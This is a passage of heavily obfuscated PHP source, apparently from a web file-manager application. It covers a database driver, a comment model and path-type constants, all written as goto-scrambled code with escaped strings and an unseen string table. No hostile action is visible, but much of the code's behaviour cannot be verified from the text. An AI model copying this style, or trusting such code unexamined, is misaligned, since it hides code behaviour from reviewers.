$c¬Â›•[33]), $c¬Â›•[34] => isset($C·œ¤‘àñ­[$c¬Â›•[34]]) ? $C·œ¤‘àñ­[$c¬Â›•[34]] : (isset($C·œ¤‘àñ­[$c¬Â›•[53]]) ? $C·œ¤‘àñ­[$c¬Â›•[53]] : $c¬Â›•[361]), $c¬Â›•[36] => isset($C·œ¤‘àñ­[$c¬Â›•[89]]) ? strtolower($C·œ¤‘àñ­[$c¬Â›•[89]]) == $c¬Â›•[38] : (isset($C·œ¤‘àñ­[$c¬Â›•[54]]) ? $C·œ¤‘àñ­[$c¬Â›•[54]] : !1), $c¬Â›•[39] => isset($C·œ¤‘àñ­[$c¬Â›•[858]]) ? strtolower($C·œ¤‘àñ­[$c¬Â›•[858]]) == $c¬Â›•[41] : (isset($C·œ¤‘àñ­[$c¬Â›•[89]]) ? $C·œ¤‘àñ­[$c¬Â›•[89]] : !1)); } } goto d–¸—±™ï; d–¸—±™ï: return $a„ôçÆŸ¬¼; goto C¾†´²˜óµ; FÆ¯ê×ŸŸÏ: $c¬Â›• =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (think_config($c¬Â›•[842])) { $f’°¶•¤Á = str_replace($c¬Â›•[843], $A˜ã­¥Úç¦, think_config($c¬Â›•[842])); } else { switch ($this->dbType) { case $c¬Â›•[826]: case $c¬Â›•[844]: $f’°¶•¤Á = "\x53\105\x4c\x45\x43\124\x20\x20\40\x63\x6f\x6c\165\155\x6e\x5f\156\x61\x6d\145\x20\x61\x73\40\47\x4e\x61\155\145\47\54\40\40\x20\144\x61\164\141\x5f\x74\171\160\145\x20\x61\x73\40\47\x54\x79\x70\x65\x27\54\x20\x20\x20\x63\157\154\x75\x6d\x6e\x5f\144\x65\146\141\165\154\x74\40\x61\163\40\47\x44\145\146\x61\165\154\x74\47\x2c\x20\x20\40\x69\x73\137\156\x75\154\154\x61\x62\154\145\40\141\163\x20\x27\116\x75\154\x6c\47\xa\11\x9\106\122\117\115\11\x69\x6e\146\157\x72\x6d\x61\x74\151\157\x6e\x5f\163\143\x68\x65\155\141\x2e\x74\141\x62\x6c\145\163\40\x41\123\40\164\12\11\x9\112\117\111\x4e\11\x69\156\x66\x6f\x72\x6d\x61\x74\151\157\x6e\137\163\143\x68\145\155\141\56\143\x6f\x6c\165\155\x6e\x73\40\101\x53\40\143\xa\x9\x9\x4f\x4e\x20\40\164\56\x74\141\x62\154\x65\137\143\x61\164\x61\154\x6f\x67\40\75\40\143\56\x74\141\142\154\145\137\143\x61\x74\141\154\x6f\147\xa\x9\11\101\116\x44\x20\164\x2e\164\x61\x62\x6c\145\137\x73\143\x68\145\x6d\x61\x20\x3d\x20\x63\56\x74\x61\142\154\x65\137\163\143\x68\x65\x6d\141\xa\x9\x9\x41\x4e\x44\40\x74\56\x74\141\x62\154\145\x5f\156\141\x6d\x65\x20\x3d\40\143\x2e\x74\x61\142\x6c\x65\x5f\x6e\x61\155\x65\xa\11\11\x57\x48\x45\122\x45\x20\x20\40\164\56\x74\x61\142\x6c\145\x5f\156\x61\x6d\145\x20\x3d\x20\x27{$A˜ã­¥Úç¦}\47"; break; case $c¬Â›•[845]: $f’°¶•¤Á = $c¬Â›•[846] . $A˜ã­¥Úç¦ . $c¬Â›•[847]; break; case $c¬Â›•[827]: case $c¬Â›•[829]: $f’°¶•¤Á = $c¬Â›•[848] . $c¬Â›•[849] . $c¬Â›•[850] . strtoupper($A˜ã­¥Úç¦) . $c¬Â›•[851] . strtoupper($A˜ã­¥Úç¦) . $c¬Â›•[852]; break; case $c¬Â›•[853]: $f’°¶•¤Á = $c¬Â›•[854] . $A˜ã­¥Úç¦ . $c¬Â›•[855]; break; case $c¬Â›•[828]: break; case $c¬Â›•[856]: default: $f’°¶•¤Á = $c¬Â›•[857] . ($this->dbType == $c¬Â›•[856] ? "\140{$A˜ã­¥Úç¦}\x60" : $A˜ã­¥Úç¦); } } goto Dªš×†Ñç; C¾†´²˜óµ: } public function getTables($EŠö»¢ŞÜ˜ = '') { $e Üˆ–ÑÛÍ =& $_SERVER[Å¸ş]; if (think_config($e Üˆ–ÑÛÍ[859])) { $e“Î‘ø„Å§ = str_replace($e Üˆ–ÑÛÍ[860], $EŠö»¢ŞÜ˜, think_config($e Üˆ–ÑÛÍ[859])); } else { switch ($this->dbType) { case $e Üˆ–ÑÛÍ[827]: case $e Üˆ–ÑÛÍ[829]: $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[861]; break; case $e Üˆ–ÑÛÍ[826]: case $e Üˆ–ÑÛÍ[844]: $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[862]; break; case $e Üˆ–ÑÛÍ[853]: $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[863]; break; case $e Üˆ–ÑÛÍ[828]: think_exception(think_lang($e Üˆ–ÑÛÍ[864]) . $e Üˆ–ÑÛÍ[865]); break; case $e Üˆ–ÑÛÍ[845]: $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[42] . $e Üˆ–ÑÛÍ[43] . $e Üˆ–ÑÛÍ[44]; break; case $e Üˆ–ÑÛÍ[856]: default: if (!empty($EŠö»¢ŞÜ˜)) { $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[809] . $EŠö»¢ŞÜ˜; } else { $e“Î‘ø„Å§ = $e Üˆ–ÑÛÍ[810]; } } } $b„»ÖÂ“” = $this->query($e“Î‘ø„Å§); $C …Ö³ªğ = array(); foreach ($b„»ÖÂ“” as $AÏ®ÆµìôÏ => $c½´ÉÙ§Ô©) { $C …Ö³ªğ[$AÏ®ÆµìôÏ] = current($c½´ÉÙ§Ô©); } return $C …Ö³ªğ; } protected function parseLimit($eÚ†¹öÒµ) { $FÊëÉ”£  =& $_SERVER[Å¸ş]; $B»ã§Ç’Ô = $FÊëÉ”£ [33]; if (!empty($eÚ†¹öÒµ)) { switch ($this->dbType) { case $FÊëÉ”£ [853]: case $FÊëÉ”£ [845]: $eÚ†¹öÒµ = explode($FÊëÉ”£ [47], $eÚ†¹öÒµ); if (count($eÚ†¹öÒµ) > 1) { $B»ã§Ç’Ô .= $FÊëÉ”£ [48] . $eÚ†¹öÒµ[1] . $FÊëÉ”£ [49] . $eÚ†¹öÒµ[0] . $FÊëÉ”£ [50]; } else { $B»ã§Ç’Ô .= $FÊëÉ”£ [48] . $eÚ†¹öÒµ[0] . $FÊëÉ”£ [50]; } break; case $FÊëÉ”£ [826]: case $FÊëÉ”£ [844]: break; case $FÊëÉ”£ [828]: break; case $FÊëÉ”£ [827]: case $FÊëÉ”£ [829]: break; case $FÊëÉ”£ [856]: default: $B»ã§Ç’Ô .= $FÊëÉ”£ [48] . $eÚ†¹öÒµ . $FÊëÉ”£ [50]; } } return $B»ã§Ç’Ô; } public function parseKey(&$cÏæ„¥³Àæ, $c‚Œ‰ÃØÚ’ = true) { $aëçÖÒ‹Î· =& $_SERVER[Å¸ş]; if ($c‚Œ‰ÃØÚ’) { $cÏæ„¥³Àæ = $this->parseKeyCheck($cÏæ„¥³Àæ); } if ($this->dbType == $aëçÖÒ‹Î·[856]) { if ($cÏæ„¥³Àæ != $aëçÖÒ‹Î·[176] && !preg_match($aëçÖÒ‹Î·[820], $cÏæ„¥³Àæ)) { $cÏæ„¥³Àæ = $aëçÖÒ‹Î·[821] . trim($cÏæ„¥³Àæ, $aëçÖÒ‹Î·[821]) . $aëçÖÒ‹Î·[821]; } return $cÏæ„¥³Àæ; } else { return parent::parseKey($cÏæ„¥³Àæ); } } public function close() { $this->_linkID = null; } public function error() { $eŒß½Š¾± =& $_SERVER[Å¸ş]; if ($this->PDOStatement) { $eâ‰ÃğîÚŒ = $this->PDOStatement->errorInfo(); $this->error = $eâ‰ÃğîÚŒ[1] . $eŒß½Š¾±[4] . $eâ‰ÃğîÚŒ[2]; } else { $this->error = $eŒß½Š¾±[33]; } if ($eŒß½Š¾±[33] != $this->queryStr) { $this->error .= LNG($eŒß½Š¾±[45]) . $this->queryStr; } think_trace($this->error, $eŒß½Š¾±[33], $eŒß½Š¾±[46]); return $this->error; } public function escapeString($F·ñ’¦³¸³) { $fØç‡šÂ =& $_SERVER[Å¸ş]; switch ($this->dbType) { case $fØç‡šÂ[853]: case $fØç‡šÂ[826]: case $fØç‡šÂ[844]: case $fØç‡šÂ[856]: return addslashes($F·ñ’¦³¸³); case $fØç‡šÂ[828]: case $fØç‡šÂ[845]: case $fØç‡šÂ[827]: case $fØç‡šÂ[829]: return str_ireplace($fØç‡šÂ[55], $fØç‡šÂ[56], $F·ñ’¦³¸³); } } protected function parseValue($DŠìÙ”á˜È) { $dùÜ¯‚˜¾æ =& $_SERVER[Å¸ş]; if (is_string($DŠìÙ”á˜È)) { $DŠìÙ”á˜È = strpos($DŠìÙ”á˜È, $dùÜ¯‚˜¾æ[4]) === 0 ? $this->escapeString($DŠìÙ”á˜È) : $dùÜ¯‚˜¾æ[866] . $this->escapeString($DŠìÙ”á˜È) . $dùÜ¯‚˜¾æ[866]; } elseif (isset($DŠìÙ”á˜È[0]) && is_string($DŠìÙ”á˜È[0]) && strtolower($DŠìÙ”á˜È[0]) == $dùÜ¯‚˜¾æ[285]) { $DŠìÙ”á˜È = $this->escapeString($DŠìÙ”á˜È[1]); } elseif (is_array($DŠìÙ”á˜È)) { $DŠìÙ”á˜È = array_map(array($this, $dùÜ¯‚˜¾æ[867]), $DŠìÙ”á˜È); } elseif (is_bool($DŠìÙ”á˜È)) { $DŠìÙ”á˜È = $DŠìÙ”á˜È ? $dùÜ¯‚˜¾æ[83] : $dùÜ¯‚˜¾æ[470]; } elseif (is_null($DŠìÙ”á˜È)) { $DŠìÙ”á˜È = $dùÜ¯‚˜¾æ[99]; } return $DŠìÙ”á˜È; } public function getLastInsertId() { $B…†™‘Å§å =& $_SERVER[Å¸ş]; switch ($this->dbType) { case $B…†™‘Å§å[853]: case $B…†™‘Å§å[845]: case $B…†™‘Å§å[826]: case $B…†™‘Å§å[844]: case $B…†™‘Å§å[828]: case $B…†™‘Å§å[856]: return $this->_linkID->lastInsertId(); case $B…†™‘Å§å[827]: case $B…†™‘Å§å[829]: $D…½Šì‚ = $this->table; $c”âÚø‚Øğ = $this->query("\123\x45\114\105\103\x54\40{$D…½Šì‚}\x2e\x63\165\x72\162\x76\x61\154\40\x63\x75\162\162\x76\x61\x6c\40\x46\x52\117\115\x20\x64\x75\x61\154"); return $c”âÚø‚Øğ ? $c”âÚø‚Øğ[0][$B…†™‘Å§å[868]] : 0; } } } goto bèâ½Êë¾ç; f²ÄÁÌ—‰ß: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\x6e\164"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\x6d\x65" => "\x63\x6f\x6d\155\145\156\164\x5f\155\x65\x74\x61", "\155\145\164\141\x46\151\x65\154\x64" => "\143\x6f\x6d\x6d\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c¤¤ƒİê¡±) { $F‰éŒ–½˜¸ =& $_SERVER[Å¸ş]; if ($c¤¤ƒİê¡±[$F‰éŒ–½˜¸[2135]]) { $a‡ÄØê½¼Œ = $this->where(array($F‰éŒ–½˜¸[2136] => $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[2135]]))->find(); if (!$a‡ÄØê½¼Œ || $a‡ÄØê½¼Œ[$F‰éŒ–½˜¸[371]] != $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[371]] || $a‡ÄØê½¼Œ[$F‰éŒ–½˜¸[458]] != $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[458]]) { return !1; } $this->where(array($F‰éŒ–½˜¸[2136] => $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[2135]]))->setAdd($F‰éŒ–½˜¸[2137], 1); } $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[2138]] = 0; $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[2137]] = 0; $c¤¤ƒİê¡±[$F‰éŒ–½˜¸[692]] = 1; return $this->add($c¤¤ƒİê¡±); } public function remove($Eµì¼‚”Â) { $DŸ‡»çôîá =& $_SERVER[Å¸ş]; $fšóºÆÄ‡¯ = array($DŸ‡»çôîá[2136] => $Eµì¼‚”Â); $d¤¬‰«÷î« = $this->where($fšóºÆÄ‡¯)->find(); if ($d¤¬‰«÷î«[$DŸ‡»çôîá[2135]]) { $this->where(array($DŸ‡»çôîá[2136] => $d¤¬‰«÷î«[$DŸ‡»çôîá[2135]]))->setAdd($DŸ‡»çôîá[2137], -1); } return $this->where($fšóºÆÄ‡¯)->delete(); } public function edit($d¶äœ«‚«¡, $cñ´±‡ò†·) { $eÛ‹äÙãìô =& $_SERVER[Å¸ş]; $dñæÏôÊº¨ = array($eÛ‹äÙãìô[2136] => $d¶äœ«‚«¡); return $this->where($dñæÏôÊº¨)->save(array($eÛ‹äÙãìô[2139] => $cñ´±‡ò†·)); } public function prasise($b¡Êï»é–) { $B”åŒÃ¯¼Š =& $_SERVER[Å¸ş]; $Dø·æÔ¿†Á = Model($B”åŒÃ¯¼Š[2140]); $e„ç—ˆåË¶ = array($B”åŒÃ¯¼Š[2136] => $b¡Êï»é–, $B”åŒÃ¯¼Š[1427] => USER_ID); $cÍ„¸ø¡ÉÃ = $Dø·æÔ¿†Á->where($e„ç—ˆåË¶)->find(); if (!$cÍ„¸ø¡ÉÃ) { $Dø·æÔ¿†Á->add($e„ç—ˆåË¶); $Eµ¹§ƒÄ×ğ = $this->where(array($B”åŒÃ¯¼Š[2136] => $b¡Êï»é–))->setAdd($B”åŒÃ¯¼Š[2138], 1); } else { $Dø·æÔ¿†Á->where($e„ç—ˆåË¶)->delete(); $Eµ¹§ƒÄ×ğ = $this->where(array($B”åŒÃ¯¼Š[2136] => $b¡Êï»é–))->setAdd($B”åŒÃ¯¼Š[2138], -1); } return $Eµ¹§ƒÄ×ğ; } public function targetInfo($bó×ÓŸ¤»Ù, $b“Ä„¡Åº©) { goto AÙÏÔØ×˜Î; AÙÏÔØ×˜Î: $dò×¥¿ÊÈÔ =& $_SERVER[Å¸ş]; $AĞÖÄâÊÊ = array($dò×¥¿ÊÈÔ[523] => $bó×ÓŸ¤»Ù, $dò×¥¿ÊÈÔ[524] => $b“Ä„¡Åº©); $CÎ‰‹Ä— = $this->where($AĞÖÄâÊÊ)->count(); goto d“ò‰Å…Õ ; D ±Ê»ˆÆ: return $c½Ù°Â¡µ£; goto aà–¸ˆĞé; d“ò‰Å…Õ : $BæİµÜé»µ = "\x52\111\107\x48\124\x20\x4a\117\111\116\40{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\x74\137\x70\162\141\x69\x73\145\x20\163\164\141\162\x20\x6f\x6e\40\x63\x6f\155\155\145\x6e\164\x2e\x63\157\x6d\155\x65\156\x74\x49\104\x20\x3d\40\x73\164\x61\162\56\143\x6f\155\x6d\145\x6e\164\111\x44"; $fÃ±Å’†îò = $this->alias($dò×¥¿ÊÈÔ[341])->where($AĞÖÄâÊÊ)->join($BæİµÜé»µ, $dò×¥¿ÊÈÔ[2141])->count(); $c½Ù°Â¡µ£ = array($dò×¥¿ÊÈÔ[2142] => $CÎ‰‹Ä—, $dò×¥¿ÊÈÔ[2143] => $fÃ±Å’†îò); goto D ±Ê»ˆÆ; aà–¸ˆĞé: } public function listData($CÍÇ«œïË) { $F„ÊÏÜœ­ =& $_SERVER[Å¸ş]; if (isset($CÍÇ«œïË[$F„ÊÏÜœ­[2144]])) { if ($CÍÇ«œïË[$F„ÊÏÜœ­[2144]]) { $CÍÇ«œïË[$F„ÊÏÜœ­[2145]] = array($F„ÊÏÜœ­[925], intval($CÍÇ«œïË[$F„ÊÏÜœ­[2144]])); } unset($CÍÇ«œïË[$F„ÊÏÜœ­[2144]]); } if (isset($CÍÇ«œïË[$F„ÊÏÜœ­[2146]])) { if ($CÍÇ«œïË[$F„ÊÏÜœ­[2146]]) { $CÍÇ«œïË[$F„ÊÏÜœ­[2145]] = array($F„ÊÏÜœ­[922], intval($CÍÇ«œïË[$F„ÊÏÜœ­[2146]])); } unset($CÍÇ«œïË[$F„ÊÏÜœ­[2146]]); } return $this->_listData($CÍÇ«œïË); } private function _listData($A³ß¼ø£æã) { $dù—‘óè¬» =& $_SERVER[Å¸ş]; $A‡«Ñ†ã‡É = $this->where($A³ß¼ø£æã)->_makeOrder()->selectPage(100); $this->_listAppendParent($A‡«Ñ†ã‡É[$dù—‘óè¬»[354]]); $this->_listAppendUser($A‡«Ñ†ã‡É[$dù—‘óè¬»[354]]); $this->_listAppendMeta($A‡«Ñ†ã‡É[$dù—‘óè¬»[354]]); return $A‡«Ñ†ã‡É; } private function _makeOrder() { $A„Û¾„ñ¼ø =& $_SERVER[Å¸ş]; $b‹ÚØñ™á¥ = array($A„Û¾„ñ¼ø[2138], $A„Û¾„ñ¼ø[2137], $A„Û¾„ñ¼ø[187]); $Cç³´ëÙİ = Input::get($A„Û¾„ñ¼ø[407], $A„Û¾„ñ¼ø[7], $A„Û¾„ñ¼ø[389], $b‹ÚØñ™á¥); $FÔö‰é–ßÉ = Input::get($A„Û¾„ñ¼ø[408], $A„Û¾„ñ¼ø[7], $A„Û¾„ñ¼ø[1429], array($A„Û¾„ñ¼ø[2147], $A„Û¾„ñ¼ø[405])); $C¹Ì°Å…²µ = $Cç³´ëÙİ . $A„Û¾„ñ¼ø[50] . $FÔö‰é–ßÉ; return $this->order($C¹Ì°Å…²µ); } private function _listAppendParent(&$aÓÒ«É¬) { goto Fê‹£±ì¬; eêÎ—İá¶Ü: if (!$d¦‚Üİ•È) { return; } $CŸ‚ºÎÉ×º = $this->where(array($eê‘¸ƒÊğÓ[2136] => array($eê‘¸ƒÊğÓ[7], $d¦‚Üİ•È)))->select(); $CŸ‚ºÎÉ×º = array_to_keyvalue($CŸ‚ºÎÉ×º, $eê‘¸ƒÊğÓ[2145]); goto A´½ÓÈ—´ë; Fê‹£±ì¬: $eê‘¸ƒÊğÓ =& $_SERVER[Å¸ş]; $d¦‚Üİ•È = array_unique(array_to_keyvalue($aÓÒ«É¬, $eê‘¸ƒÊğÓ[33], $eê‘¸ƒÊğÓ[2135])); $d¦‚Üİ•È = array_remove_value($d¦‚Üİ•È, $eê‘¸ƒÊğÓ[470]); goto eêÎ—İá¶Ü; A´½ÓÈ—´ë: foreach ($aÓÒ«É¬ as &$aˆÃ†òÊ®) { if (isset($CŸ‚ºÎÉ×º[$aˆÃ†òÊ®[$eê‘¸ƒÊğÓ[2135]]])) { $aˆÃ†òÊ®[$eê‘¸ƒÊğÓ[2148]] = $CŸ‚ºÎÉ×º[$aˆÃ†òÊ®[$eê‘¸ƒÊğÓ[2135]]]; } } unset($aˆÃ†òÊ®); goto CÙ™×ë; CÙ™×ë: } private function _listAppendUser(&$e—ò½Ú‚íÖ) { goto DÜğÖÁ—®; DÜğÖÁ—®: $Bè¬ááÅ‘Ü =& $_SERVER[Å¸ş]; $B¶‚öòó = array_unique(array_to_keyvalue($e—ò½Ú‚íÖ, $Bè¬ááÅ‘Ü[33], $Bè¬ááÅ‘Ü[1436])); $B¶‚öòó = array_remove_value($B¶‚öòó, $Bè¬ááÅ‘Ü[470]); goto D¹ß ‰; D¹ß ‰: if (count($B¶‚öòó) == 0) { return; } foreach ($e—ò½Ú‚íÖ as $cÙ›ªª’º´) { if (isset($cÙ›ªª’º´[$Bè¬ááÅ‘Ü[2148]])) { $B¶‚öòó[] = $cÙ›ªª’º´[$Bè¬ááÅ‘Ü[2148]][$Bè¬ááÅ‘Ü[1436]]; } } $aÂ†ß§½»› = Model($Bè¬ááÅ‘Ü[479])->userListInfo($B¶‚öòó); goto A‹´Ë ùŠ; A‹´Ë ùŠ: foreach ($e—ò½Ú‚íÖ as &$cÙ›ªª’º´) { $cÙ›ªª’º´[$Bè¬ááÅ‘Ü[537]] = $aÂ†ß§½»›[$cÙ›ªª’º´[$Bè¬ááÅ‘Ü[1436]]]; if (isset($cÙ›ªª’º´[$Bè¬ááÅ‘Ü[2148]])) { $cÙ›ªª’º´[$Bè¬ááÅ‘Ü[2148]][$Bè¬ááÅ‘Ü[537]] = $aÂ†ß§½»›[$cÙ›ªª’º´[$Bè¬ááÅ‘Ü[2148]][$Bè¬ááÅ‘Ü[1436]]]; } } unset($cÙ›ªª’º´); goto EÅíí­–; EÅíí­–: } private function _listAppendMeta(&$BÓÚÆÉÑ‘) { goto a¤Â³ò²“Ô; dÅ ±¯Òç: if (!$BĞ¡³Äˆêˆ) { return !1; } foreach ($BÓÚÆÉÑ‘ as &$FšŠìºÏèÈ) { $FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[417]] = $BĞ¡³Äˆêˆ[$FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2145]]]; if (isset($FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2148]])) { $FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2148]][$FÌ®İ¦Ø§÷[417]] = $BĞ¡³Äˆêˆ[$FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2148]][$FÌ®İ¦Ø§÷[2145]]]; } } unset($FšŠìºÏèÈ); goto bÌ¹×óË‘; a¤Â³ò²“Ô: $FÌ®İ¦Ø§÷ =& $_SERVER[Å¸ş]; $FšÏˆ†ØŸ = array_unique(array_to_keyvalue($BÓÚÆÉÑ‘, $FÌ®İ¦Ø§÷[33], $FÌ®İ¦Ø§÷[2145])); $FšÏˆ†ØŸ = array_remove_value($FšÏˆ†ØŸ, $FÌ®İ¦Ø§÷[470]); goto BœÆîŞâà; BœÆîŞâà: if (!$FšÏˆ†ØŸ) { return; } foreach ($BÓÚÆÉÑ‘ as $FšŠìºÏèÈ) { if (isset($FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2148]])) { $FšÏˆ†ØŸ[] = $FšŠìºÏèÈ[$FÌ®İ¦Ø§÷[2148]][$FÌ®İ¦Ø§÷[2145]]; } } $BĞ¡³Äˆêˆ = $this->metaList($FšÏˆ†ØŸ); goto dÅ ±¯Òç; bÌ¹×óË‘: } private function metaList($aÌ†ˆ†Æõ“) { goto fÂ¡çáë­; aµ­™‚æÀ¢: $cœ®ãëŒ‰„ = Model($CÜÀÓ¾‡Õƒ[2149])->where($Eï§½è§ø)->select(); $cœ®ãëŒ‰„ = array_to_keyvalue_group($cœ®ãëŒ‰„, $CÜÀÓ¾‡Õƒ[2145]); foreach ($cœ®ãëŒ‰„ as $E´Ï±Øğ± => $dÇ×àô³Ä¸) { $E®¤ˆÈ¢ö„ = array(); foreach ($dÇ×àô³Ä¸ as $a‰¤¸¿™Œ) { $E®¤ˆÈ¢ö„[$a‰¤¸¿™Œ[$CÜÀÓ¾‡Õƒ[89]]] = $a‰¤¸¿™Œ[$CÜÀÓ¾‡Õƒ[359]]; } $cœ®ãëŒ‰„[$E´Ï±Øğ±] = $E®¤ˆÈ¢ö„; } goto a¢‹«çÉÄ; fÂ¡çáë­: $CÜÀÓ¾‡Õƒ =& $_SERVER[Å¸ş]; if (!$aÌ†ˆ†Æõ“) { return array(); } $Eï§½è§ø = array($CÜÀÓ¾‡Õƒ[2145] => array($CÜÀÓ¾‡Õƒ[7], $aÌ†ˆ†Æõ“)); goto aµ­™‚æÀ¢; a¢‹«çÉÄ: return $cœ®ãëŒ‰„ ? $cœ®ãëŒ‰„ : array(); goto AÔĞ‘µ¯˜‰; AÔĞ‘µ¯˜‰: } } $cëØÂäßÏ¤ = LIB_DIR . $_SERVER[Å¸ş][555]; $B¡ê¸‚Èä = $_SERVER[Å¸ş][556]; goto C«ÕĞ˜É™ª; eôó‡ŒÛÃî: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\163\145\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\106\151\154\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\106\x69\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\160\x52\x6f\157\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\x53\150\x61\x72\x65\x4c\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\145\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\162\145\x49\164\x65\155\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\x63\150\175"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\162\122\x65\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\x65\x72\x7d"; public static function typeList() { $Bß©í‚æ =& $_SERVER[Å¸ş]; return array($Bß©í‚æ[1048] => self::KOD_SOURCE, $Bß©í‚æ[1049] => self::KOD_USER_RECYCLE, $Bß©í‚æ[1050] => self::KOD_USER_FAV, $Bß©í‚æ[1051] => self::KOD_USER_FILE_TAG, $Bß©í‚æ[1052] => self::KOD_USER_FILE_TYPE, $Bß©í‚æ[1053] => self::KOD_GROUP_ROOT_SELF, $Bß©í‚æ[1054] => self::KOD_USER_SHARE, $Bß©í‚æ[1055] => self::KOD_USER_SHARE_LINK, $Bß©í‚æ[1056] => self::KOD_USER_SHARE_TO_ME, $Bß©í‚æ[1057] => self::KOD_SHARE_ITEM, $Bß©í‚æ[1058] => self::KOD_SHARE_LINK, $Bß©í‚æ[1059] => self::KOD_SEARCH, $Bß©í‚æ[1060] => self::KOD_BLOCK, $Bß©í‚æ[1061] => self::KOD_IO, $Bß©í‚æ[1062] => self::KOD_USER_RECENT, $Bß©í‚æ[1063] => self::KOD_USER_DRIVER); } public static function parse($AËÕ«ôºæŠ) { goto A °¤ÊÄ; A °¤ÊÄ: $A¼ª‡½×®î =& $_SERVER[Å¸ş]; $AËÕ«ôºæŠ = self::clear($AËÕ«ôºæŠ); $fÄÄèğá”œ = array_values(self::typeList()); goto eŸöèŒ‹¤ù; eŸöèŒ‹¤ù: preg_match($A¼ª‡½×®î[1064], $AËÕ«ôºæŠ, $eæ©§ñÖçø); $a˜ŒËÚÕïÃ = array($A¼ª‡½×®î[388] => !1, $A¼ª‡½×®î[1065] => !1, $A¼ª‡½×®î[385] => !1, $A¼ª‡½×®î[75] => $AËÕ«ôºæŠ, $A¼ª‡½×®î[1011] => !1, $A¼ª‡½×®î[1010] => $A¼ª‡½×®î[33]); if (is_array($eæ©§ñÖçø) && count($eæ©§ñÖçø) == 5) { $cÈÃ™ìª = $A¼ª‡½×®î[1066] . $eæ©§ñÖçø[2] . $A¼ª‡½×®î[315]; if (in_array($cÈÃ™ìª, $fÄÄèğá”œ)) { $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[1011]] = $eæ©§ñÖçø[1]; $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[29]] = $cÈÃ™ìª; $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[1067]] = substr($cÈÃ™ìª, 1, -1); $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[367]] = $eæ©§ñÖçø[3]; } $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[1010]] = $eæ©§ñÖçø[4]; } goto dô˜††ä„É; dô˜††ä„É: $e…¶óŞ§òç = array($A¼ª‡½×®î[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $a˜ŒËÚÕïÃ[$A¼ª‡½×®î[1068]] = in_array($a˜ŒËÚÕïÃ[$A¼ª‡½×®î[29]], $e…¶óŞ§òç); return $a˜ŒËÚÕïÃ; goto dŞ”™ÚŞ“£; dŞ”™ÚŞ“£: } public static function clear($CçŠŠŒùòö) { goto FÃùëØ„ëì; FÃùëØ„ëì: $Eâ¼Ç’Œ—§ =& $_SERVER[Å¸ş]; $CçŠŠŒùòö = str_replace(array($Eâ¼Ç’Œ—§[990], $Eâ¼Ç’Œ—§[217]), $Eâ¼Ç’Œ—§[50], $CçŠŠŒùòö); $CçŠŠŒùòö = str_replace($Eâ¼Ç’Œ—§[93], $Eâ¼Ç’Œ—§[8], $CçŠŠŒùòö); goto C¨¬šé™—§; AÆ—Ûß©‡ã: $CçŠŠŒùòö = preg_replace($Eâ¼Ç’Œ—§[1071], $Eâ¼Ç’Œ—§[8], $CçŠŠŒùòö); if ($CçŠŠŒùòö == $Eâ¼Ç’Œ—§[8]) { return $Eâ¼Ç’Œ—§[8]; } $CçŠŠŒùòö = rtrim($CçŠŠŒùòö, $Eâ¼Ç’Œ—§[8]); goto a¤¾ëõ†‰Ø; a¤¾ëõ†‰Ø: return $CçŠŠŒùòö; goto bÚ–øÖÃ°; C¨¬šé™—§: $Eƒ‡Å‰ = $Eâ¼Ç’Œ—§[1069]; if (substr($CçŠŠŒùòö, 0, 3) == $Eâ¼Ç’Œ—§[1070]) { $CçŠŠŒùòö = substr($CçŠŠŒùòö, 3); } while (strstr($CçŠŠŒùòö, $Eƒ‡Å‰)) { $CçŠŠŒùòö = str_replace($Eƒ‡Å‰, $Eâ¼Ç’Œ—§[8], 